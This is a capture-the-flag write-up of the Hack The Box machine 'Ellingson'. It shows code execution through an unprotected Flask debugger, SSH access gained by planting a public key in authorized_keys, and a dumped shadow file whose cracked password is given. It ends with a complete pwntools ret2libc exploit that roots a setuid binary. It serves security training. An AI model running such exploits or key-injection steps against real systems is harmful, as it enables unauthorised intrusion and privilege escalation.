## Ellingson

What a beautiful machine this was to Root! Starting with a Hackers theme, with tonnes of references from the movie! to an amazing Binary Exploitation based Privilege Escalation.

So let's dig in! 

----
Initial Enumeration

---

I add  `10.10.10.139` as `ellingson.htb` to my hosts file. Now, as usual run a nmap scan to enumerate open ports and services.

```
 -> nmap -sV -sC -v ellingson.htb

Starting Nmap 7.60 ( https://nmap.org ) at 2019-10-18 20:33 IST
NSE: Loaded 146 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 20:33
Completed NSE at 20:33, 0.00s elapsed
Initiating NSE at 20:33
Completed NSE at 20:33, 0.00s elapsed
Initiating Ping Scan at 20:33
Scanning ellingson.htb (10.10.10.139) [2 ports]
Completed Ping Scan at 20:33, 0.36s elapsed (1 total hosts)
Initiating Connect Scan at 20:33
Scanning ellingson.htb (10.10.10.139) [1000 ports]
Discovered open port 22/tcp on 10.10.10.139
Discovered open port 80/tcp on 10.10.10.139
Completed Connect Scan at 20:34, 29.78s elapsed (1000 total ports)
Initiating Service scan at 20:34
Scanning 2 services on ellingson.htb (10.10.10.139)
Completed Service scan at 20:34, 6.95s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.10.139.
Initiating NSE at 20:34
Completed NSE at 20:34, 14.08s elapsed
Initiating NSE at 20:34
Completed NSE at 20:34, 0.00s elapsed
Nmap scan report for ellingson.htb (10.10.10.139)
Host is up (0.42s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:e8:f1:2a:80:62:de:7e:02:40:a1:f4:30:d2:88:a6 (RSA)
|   256 c8:02:cf:a0:f2:d8:5d:4f:7d:c7:66:0b:4d:5d:0b:df (ECDSA)
|_  256 a5:a9:95:f5:4a:f4:ae:f8:b6:37:92:b8:9a:2a:b4:66 (EdDSA)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.14.0 (Ubuntu)
| http-title: Ellingson Mineral Corp
|_Requested resource was http://ellingson.htb/index
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 20:34
Completed NSE at 20:34, 0.00s elapsed
Initiating NSE at 20:34
Completed NSE at 20:34, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.58 seconds

```

So we have a open HTTP Port and a SSH. Let's enumerate the HTTP port first.

So, I run a dirsearch on it. 
```
python dirsearch.py -u http://ellingson.htb/ -t 100 -e *

 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions: CHANGELOG.md | Threads: 100 | Wordlist size: 6084

Error Log: /home/vipul/Desktop/CTF/dirsearch/logs/errors-19-10-18_20-36-27.log

Target: http://ellingson.htb/

[20:36:28] Starting: 
[20:36:31] 400 -  182B  - /%2e%2e/google.com
[20:36:58] 301 -  194B  - /assets  ->  http://ellingson.htb/assets/
[20:37:13] 301 -  194B  - /images  ->  http://ellingson.htb/images/
[20:37:13] 200 -    6KB - /index

Task Completed
```

Meh, nothing useful apart from the index.

On visiting index : 

![Image](./index)

Aah the Ellingson Mineral Corp, or the place where The Plague Works xD

On checking out various articles, nothing useful yet.

```
http://ellingson.htb/articles/2
```

the url, seems like something Django/Flask Applications might use, with `GET` parameters passed in the nice looking / format.

So, let's change 2 to something else,

```
http://ellingson.htb/articles/10
```

AAND! We have a crash!

![Image](./crash1)

---
RCE

---


I was correct, the application is in fact a Flask Application. 

The thing about Flask applications is that, they come with a built in debugger. Which may or maynot be secured using a passphrase. 

And luckily, this one isn't.

![Image](./rce)

We have a source of RCE now.

We do need a proper tty shell to continue, after spending hours on trying to get a reverse shell, I thought, this machine also has a ssh port open. So there's gotta be a `.ssh` folder. Let's `ls -la`

```
subprocess.check_output(['ls -la /home/hal'],shell=True).decode().replace('\\n','\n')
'total 36\ndrwxrwx--- 5 hal  hal  4096 May  7 13:12 .\ndrwxr-xr-x 6 root root 4096 Mar  9  2019 ..\n-rw-r--r-- 1 hal  hal   220 Mar  9  2019 .bash_logout\n-rw-r--r-- 1 hal  hal  3771 Mar  9  2019 .bashrc\ndrwx------ 2 hal  hal  4096 Mar 10  2019 .cache\ndrwx------ 3 hal  hal  4096 Mar 10  2019 .gnupg\n-rw-r--r-- 1 hal  hal   807 Mar  9  2019 .profile\ndrwx------ 2 hal  hal  4096 Mar  9  2019 .ssh\n-rw------- 1 hal  hal   865 Mar  9  2019 .viminfo\n'
```

And we do have a `.ssh` folder. To get a full ssh shell, we need to add our public key to its authorized_keys

```
>>> f = open("/home/hal/.ssh/authorized_keys","w")
>>> f.write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDpiK8whgtBu6DXmYMs41r9kiKM3AVbP6UJAhzV6xTASrAHwn4+wt55soFVFMFUIlAKU2uI5F860YMsLkO46YuJWH6IHTvL6BZ/92T5D5ySX9UMmaaN0CJVyvxrvC8ucACpvUR6AttNWKsxAFRFUmQ3Xbxk1CXtfRBSuQDjJISNifsACWy7d4tObBo/DHmQX/dHsXEKZxfhhu0OSpY/nvPP5I0m3wdC8c7vRgaGazYKFlc2gUcNWVqOqKCxzYNg1rNEO7NxlftIJYhpQ/ngBjVvT4sX6ph4jEcep8K9cx7CQJSJ57OprUkjnA4v3x7pjiSaNh4fo8N+KaLK0RAJgoLp green@pro")
>>> f.close()
```
And BAM!

```
ssh hal@ellingson.htb -i id_rsa2
Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-46-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Oct 18 15:39:16 UTC 2019

  System load:  0.09               Processes:            97
  Usage of /:   23.6% of 19.56GB   Users logged in:      0
  Memory usage: 13%                IP address for ens33: 10.10.10.139
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

163 packages can be updated.
80 updates are security updates.


Last login: Sun Mar 10 21:36:56 2019 from 192.168.1.211
hal@ellingson:~$ 
```

but since this user doesn't have `user.txt`, it's privesc time!

---
Privilege Escalation

---

This is basically the part I was stuck for the longest time! After enumerating time afer time, I had to ask for a couple of hints on how to move on. Apparently, there is /etc/shadow.bak file which I couldn't find even after multiple resets. I did find it finally. For those who don't find it, here it is
```
root:*:17737:0:99999:7:::
daemon:*:17737:0:99999:7:::
bin:*:17737:0:99999:7:::
sys:*:17737:0:99999:7:::
sync:*:17737:0:99999:7:::
games:*:17737:0:99999:7:::
man:*:17737:0:99999:7:::
lp:*:17737:0:99999:7:::
mail:*:17737:0:99999:7:::
news:*:17737:0:99999:7:::
uucp:*:17737:0:99999:7:::
proxy:*:17737:0:99999:7:::
www-data:*:17737:0:99999:7:::
backup:*:17737:0:99999:7:::
list:*:17737:0:99999:7:::
irc:*:17737:0:99999:7:::
gnats:*:17737:0:99999:7:::
nobody:*:17737:0:99999:7:::
systemd-network:*:17737:0:99999:7:::
systemd-resolve:*:17737:0:99999:7:::
syslog:*:17737:0:99999:7:::
messagebus:*:17737:0:99999:7:::
_apt:*:17737:0:99999:7:::
lxd:*:17737:0:99999:7:::
uuidd:*:17737:0:99999:7:::
dnsmasq:*:17737:0:99999:7:::
landscape:*:17737:0:99999:7:::
pollinate:*:17737:0:99999:7:::
sshd:*:17737:0:99999:7:::
theplague:$6$.5ef7Dajxto8Lz3u$Si5BDZZ81UxRCWEJbbQH9mBCdnuptj/aG6mqeu9UfeeSY7Ot9gp2wbQLTAJaahnlTrxN613L6Vner4tO1W.ot/:17964:0:99999:7:::
hal:$6$UYTy.cHj$qGyl.fQ1PlXPllI4rbx6KM.lW6b3CJ.k32JxviVqCC2AJPpmybhsA8zPRf0/i92BTpOKtrWcqsFAcdSxEkee30:17964:0:99999:7:::
margo:$6$Lv8rcvK8$la/ms1mYal7QDxbXUYiD7LAADl.yE4H7mUGF6eTlYaZ2DVPi9z1bDIzqGZFwWrPkRrB9G/kbd72poeAnyJL4c1:17964:0:99999:7:::
duke:$6$bFjry0BT$OtPFpMfL/KuUZOafZalqHINNX/acVeIDiXXCPo9dPi1YHOp9AAAAnFTfEh.2AheGIvXMGMnEFl5DlTAbIzwYc/:17964:0:99999:7:::
```

So, the challenge is to break the hash, we of course turn to hashcat. But, it's gonna take a lot of time to break 4 hashes. 

When you visit `http://ellingson.htb/articles/3` you'll find a hint!

![Image](passwd_hints)

Using rockyou, filter the password with `Love, Secret, Sex and God` in them. 

On breaking the hash, you'll get a access to margo with the password, `iamgod$08`


```
 ~/D/H/M/Ellingson_SOLVED  ssh margo@ellingson.htb
margo@ellingson.htb's password: 
Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-46-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Oct 18 16:03:41 UTC 2019

  System load:  0.0                Processes:            98
  Usage of /:   23.7% of 19.56GB   Users logged in:      0
  Memory usage: 16%                IP address for ens33: 10.10.10.139
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

163 packages can be updated.
80 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Oct 18 16:03:23 2019 from 10.10.14.5
margo@ellingson:~$ ls
user.txt
margo@ellingson:~$ cat user.txt 
********************************
margo@ellingson:~$ 
```
---
ROOT

---

Let's run lse.sh (LinuxSmartEnum). I created a server locally and tried wget to upload, but didn't work. So copied the script and pasted on the machine. 

On running

```
[!] fst020 Uncommon setuid binaries........................................ yes!
---
/usr/bin/garbage
---
```

For those familiar with the movie, must recognize the `garbage`. As I said, the machine was full of Easter-Eggs. Fantastic Movie, do watch it sometimes. 

It asks for a access password. With usual for binaries, I try to overflow the buffer, with `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA` and BAM! we have a `Segmentation fault (core dumped)`. The binary has a buffer overflow. I scp the binary to my local machine. 

Let the reverse engineering begin

```

ulong auth(undefined4 uParm1)

{
  int iVar1;
  undefined8 local_f8;
  undefined8 local_f0;
  undefined8 local_e8;
  undefined2 local_e0;
  char local_88 [100];
  char local_24 [12];
  undefined4 local_18;
  
  local_18 = uParm1;
  strcpy(local_24,username);
  printf("Enter access password: ");
  gets(local_88);
  putchar(10);
  iVar1 = strcmp(local_88,"N3veRF3@r1iSh3r3!");
  if (iVar1 != 0) {
    puts("access denied.");
  }
  else {
    local_f8 = 0x6720737365636361;
    local_f0 = 0x66206465746e6172;
    local_e8 = 0x3a7265737520726f;
    local_e0 = 0x20;
    strcat((char *)&local_f8,local_24);
    syslog(6,(char *)&local_f8);
    puts("access granted.");
  }
  return (ulong)(iVar1 == 0);
}

```

`strcpy` is used, which does not handle the length of the destination buffer. Hence, the BOF.

Since, Libc is used, I use a ret2libc attack. For more explanation, refer to this [writeup](http://itsvipul.com/writeups/Sec_fest/Baby1.html)

Final Exploit 

```
#! /usr/bin/python2
from pwn import *

def get_offset(binary):
    elf = binary
    #context.log_level = 'debug'
    io = process(elf.path)
    io.sendline(cyclic(2010))
    io.wait()
    core = io.corefile
    stack = core.rsp
    #info("%#x stack", stack)
    pattern = core.read(stack, 4)
    #info("%r pattern", pattern)
    offset = cyclic_find(pattern)
    #info("OFFSET : %s",offset)
    return offset

if __name__ == "__main__":
    elf = ELF("garbage")
    libc = ELF("./libc.so.6")
    #offset=get_offset(elf)
    offset = 136
    info("OFFSET : %s",offset)  
    puts_plt = elf.symbols["plt.puts"]
    info("PLT@PUTS : %s",hex(puts_plt))
    puts_got = elf.symbols["got.puts"]
    info("PUT@GOTS : %s",hex(puts_got))
    main = elf.symbols["main"]
    info("MAIN : %s",hex(main))
    rop = ROP(elf)
    pop_rdi_gadget = rop.find_gadget(['pop rdi','ret'])
    pop_rdi = pop_rdi_gadget.address
    info("POP RDI : %s",hex(pop_rdi))


    ret_gadget = rop.find_gadget(['ret'])
    ret = ret_gadget.address
    info("RET : %s",hex(ret))


    pop_rsi_gadget = rop.find_gadget(['pop rsi','pop r15','ret'])
    pop_rsi = pop_rsi_gadget.address
    
    info("POP RSI, POP 15 : %s",hex(pop_rsi))

    payload = 'A'*offset
    payload += p64(pop_rdi)
    payload += p64(puts_got)
    payload += p64(puts_plt)
    payload += p64(main)
    #print(payload)
    s = ssh(host='10.10.10.139',user='margo',password='iamgod$08')
    io = s.process('/usr/bin/garbage')
    #io = process(elf.path)
    io.recvuntil(":")
    io.sendline(payload)
    #io.recvuntil(":")
    io.recvline()
    io.recvline()
    #io.recvuntil("denied.\n")
    puts_leak = io.recvline().strip().ljust(8,'\x00')
    info("PUTS LEAK : %s",puts_leak)
    libc_puts = libc.symbols["puts"]
    info("LIBC PUTS : %s",hex(libc_puts))
    libc_system = libc.symbols["system"]
    info("LIBC SYSTEM : %s",hex(libc_system))
    libc_binsh = next(libc.search("/bin/sh"))
    info("LIBC /bin/sh : %s",hex(libc_binsh))
    libc_setreuid = libc.symbols["setreuid"]
    info("LIBC setreuid : %s",hex(libc_setreuid))
    libc_offset = u64(puts_leak) - libc_puts
    info("LIBC OFFSET : %s",hex(libc_offset))

    sys = libc_offset + libc_system
    binsh = libc_offset + libc_binsh
    setreuid = libc_offset + libc_setreuid
    payload = 'A'*offset
    payload += p64(ret)
    payload += p64(pop_rdi) 
    payload += p64(0)
    payload += p64(pop_rsi)
    payload += p64(0)
    payload += p64(0)
    payload += p64(setreuid)
    payload += p64(pop_rdi) 
    payload += p64(binsh) 
    payload += p64(sys)


    #io.recvuntil("password:")
    io.sendline(payload)
    io.recvuntil("denied.")
    io.interactive()
```

I had to make some changes with regards to the above `Writeup`, as this one also involved calling the `setreuid` function with the id `0` to get root access. 

On using the exploit

```
[*] '/home/vipul/Desktop/HackTheBox/Machines/Ellingson_SOLVED/garbage'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/home/vipul/Desktop/HackTheBox/Machines/Ellingson_SOLVED/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] OFFSET : 136
[*] PLT@PUTS : 0x401050
[*] PUT@GOTS : 0x404028
[*] MAIN : 0x401619
[*] Loaded cached gadgets for 'garbage'
[*] POP RDI : 0x40179b
[*] RET : 0x401016
[*] POP RSI, POP 15 : 0x401799
[+] Connecting to 10.10.10.139 on port 22: Done
[*] margo@10.10.10.139:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
[+] Starting remote process '/usr/bin/garbage' on 10.10.10.139: pid 2967
[*] PUTS LEAK : �\xb1A%\x7f\x00\x00
[*] LIBC PUTS : 0x809c0
[*] LIBC SYSTEM : 0x4f440
[*] LIBC /bin/sh : 0x1b3e9a
[*] LIBC setreuid : 0x116ac0
[*] LIBC OFFSET : 0x7f2541a91000
[*] Switching to interactive mode

# $ whoami
root
# $ cat /root/root.txt
********************************
```

And its rooted! .

Thank you for reading. 